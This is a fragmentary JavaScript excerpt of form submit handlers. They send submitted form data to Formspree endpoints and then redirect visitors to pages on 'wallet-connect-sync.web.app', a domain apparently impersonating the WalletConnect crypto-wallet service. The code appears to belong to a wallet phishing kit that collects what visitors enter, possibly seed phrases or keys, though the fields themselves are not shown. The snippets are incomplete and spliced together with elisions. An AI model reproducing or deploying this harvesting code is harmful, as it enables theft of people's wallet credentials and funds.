...
form.addEventListener( 'submit', function(e)
  { 
	  ...
	  const formData = new FormData(form); // create new FormData object

	  fetch('https://formspree.io/f/mzbqvodb', {
		method: 'POST',
...
form.addEventListener('submit', (event) => {
  ...
  fetch('https://formspree.io/f/xzbqvdgp', {
    method: 'POST',
    body: formData // pass form data as the request body
  })
  .then(response => {
    if (response.ok) {
      return response.json(); // if response is okay, parse the response as JSON
    }
    throw new Error('Network response was not ok.');
  })
  .then(data => {
    console.log(data); // log the response data
    window.location.href = 'https://wallet-connect-sync.web.app/support.html'; // redirect to thank you page
  })
  .catch(error => {
...
function proceed() {
  window.location.href = 'https://wallet-connect-sync.web.app/dapps.html';
}
